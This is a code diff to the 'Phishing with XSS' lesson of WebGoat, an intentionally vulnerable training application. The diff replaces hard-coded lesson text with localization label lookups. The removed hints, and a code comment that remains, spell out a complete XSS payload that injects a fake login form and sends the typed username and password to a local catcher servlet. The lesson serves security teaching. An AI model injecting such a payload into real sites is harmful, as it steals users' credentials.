@@ -103,7 +103,7 @@ public class Phishing extends LessonAdapter
             }
         } catch (Exception e)
         {
-            s.setMessage("Error generating " + this.getClass().getName());
+            s.setMessage(getLabelManager().get("PhishingErrorGenerating") + this.getClass().getName());
         }
 
         return (ec);
@@ -113,7 +113,7 @@ public class Phishing extends LessonAdapter
     {
         ElementContainer ec = new ElementContainer();
 
-        ec.addElement(new H1().addElement("WebGoat Search "));
+        ec.addElement(new H1().addElement(getLabelManager().get("PhishingDialogTitle")));
         Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign("center");
 
         TR tr = new TR();
@@ -125,7 +125,7 @@ public class Phishing extends LessonAdapter
         }
 
         tr = new TR();
-        tr.addElement(new TH().addElement("This facility will search the WebGoat source.").setColSpan(2)
+        tr.addElement(new TH().addElement(getLabelManager().get("PhishingDialogText")).setColSpan(2)
                 .setAlign("center"));
         t.addElement(tr);
 
@@ -134,13 +134,13 @@ public class Phishing extends LessonAdapter
         t.addElement(tr);
 
         TR row1 = new TR();
-        row1.addElement(new TD(new B(new StringElement("Search: "))).setAlign("right"));
+        row1.addElement(new TD(new B(new StringElement(getLabelManager().get("PhishingSearch1")))).setAlign("right"));
 
         Input input1 = new Input(Input.TEXT, SEARCH, searchText);
         row1.addElement(new TD(input1).setAlign("left"));
         t.addElement(row1);
 
-        Element b = ECSFactory.makeButton("Search");
+        Element b = ECSFactory.makeButton(getLabelManager().get("PhishingSearch2"));
         t.addElement(new TR(new TD(b).setColSpan(2)).setAlign("center"));
         ec.addElement(t);
 
@@ -149,12 +149,12 @@ public class Phishing extends LessonAdapter
             ec.addElement(new BR());
             ec.addElement(new HR());
             ec.addElement(new BR());
-            ec.addElement(new StringElement("Results for: " + searchText));
-            ec.addElement(new Comment("Search results"));
+            ec.addElement(new StringElement(getLabelManager().get("PhishingResults") + searchText));
+            ec.addElement(new Comment(getLabelManager().get("PhishingSearchResults")));
             ec.addElement(new BR());
             ec.addElement(new BR());
-            ec.addElement(new B(new StringElement("No results were found.")));
-            ec.addElement(new Comment("End of Search results"));
+            ec.addElement(new B(new StringElement(getLabelManager().get("PhishingNoResults"))));
+            ec.addElement(new Comment(getLabelManager().get("PhishingEndOfSearchResults")));
         }
 
         return (ec);
@@ -168,70 +168,18 @@ public class Phishing extends LessonAdapter
     protected List<String> getHints(WebSession s)
     {
         List<String> hints = new ArrayList<String>();
-        hints.add("Try adding HTML to the search field to create a fake authentication form.<BR>"
-                + "Try to make the form look official.");
-        hints
-                .add("Try: <BR> "
-                        + "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-                        + "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
-                        + "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
-                        + "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
-        hints
-                .add("Add functionality that can post a request, a button might work<BR><BR>"
-                        + "After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>"
-                        + "http://localhost/webgoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE");
-        hints
-                .add("Try: <BR> "
-                        + "&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-                        + "value=&quot;login&quot;&gt;"
-                        + "<BR><BR>In the whole script:<BR><BR>"
-                        + "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-                        + "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
-                        + "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
-                        + "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-                        + "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
-        hints
-                .add("Make the button perform an action on submit, <BR>"
-                        + "adding an onclick=\"hack()\" might work<BR>"
-                        + "Don't forget to add the hack() javascript function"
-                        + "<BR><BR>In the whole script:<BR><BR>"
-                        + "&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-                        + "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
-                        + "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
-                        + "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-                        + "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>"
-                        + "Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)");
-        hints
-                .add("You need to create the hack() function.  This function will pull the credentials from the "
-                        + "webpage and post them to the WebGoat catcher servlet. <BR>"
-                        + "<BR> Some useful code snippets:<UL>"
-                        + "<LI>doucument.phish.user.value - will access the user field"
-                        + "<LI>XssImage = new Image(); XssImage.src=SOME_URL = will perform a post"
-                        + "<LI>javascript string concatentation uses a \"+\" </UL>"
-                        + "<BR><BR>The entire javascript portion:<BR><BR>"
-                        + "&lt;script&gt;function hack(){ "
-                        + "XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+"
-                        + "document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;"
-                        + "alert(&quot;Had this been a real attack... Your credentials were just stolen."
-                        + "\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} "
-                        + "&lt;/script&gt;");
-        hints
-                .add("Complete solution for this lesson:<BR><BR>"
-                        + "&lt;/form&gt;&lt;script&gt;function hack(){ "
-                        + "XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+"
-                        + "document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;;"
-                        + "alert(&quot;Had this been a real attack... Your credentials were just stolen."
-                        + "\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +  document.phish.pass.value);} "
-                        + "&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2"
-                        + "&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; "
-                        + "name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; "
-                        + "name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; "
-                        + "value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;");
+        hints.add(getLabelManager().get("PhishingHint1"));
+        hints.add(getLabelManager().get("PhishingHint2"));
+        hints.add(getLabelManager().get("PhishingHint3"));
+        hints.add(getLabelManager().get("PhishingHint4"));
+        hints.add(getLabelManager().get("PhishingHint5"));
+        hints.add(getLabelManager().get("PhishingHint6"));
+        hints.add(getLabelManager().get("PhishingHint7"));
         /**
          * password<script>function hack(){ alert("Had this been a real attack... Your credentials
          * were just stolen.\nUser Name = " + document.phish.user.value + "\nPassword = " +
          * document.phish.pass.value); XSSImage=new Image;
-         * XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="
+         * XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user="
          * +document.phish.user.value + "&password=" + document.phish.pass.value +
          * "";}</script><form name="phish"><br>
          * <br>
@@ -258,14 +206,7 @@ public class Phishing extends LessonAdapter
      */
     public String getInstructions(WebSession s)
     {
-        String instructions = "This lesson is an example of how a website might support a phishing attack<BR><BR>"
-                + "Below is an example of a standard search feature.<br>"
-                + "Using XSS and HTML insertion, your goal is to: <UL>"
-                + "<LI>Insert html to that requests credentials"
-                + "<LI>Add javascript to actually collect the credentials"
-                + "<LI>Post the credentials to http://localhost/webgoat/catcher?PROPERTY=yes...</UL> "
-                + "To pass this lesson, the credentials must be posted to the catcher servlet.<BR>";
-
+        String instructions = getLabelManager().get("PhishingInstructions");
         return (instructions);
     }
 
@@ -293,7 +234,7 @@ public class Phishing extends LessonAdapter
      */
     public String getTitle()
     {
-        return ("Phishing with XSS");
+        return (getLabelManager().get("PhishingTitle"));
     }
 
 }
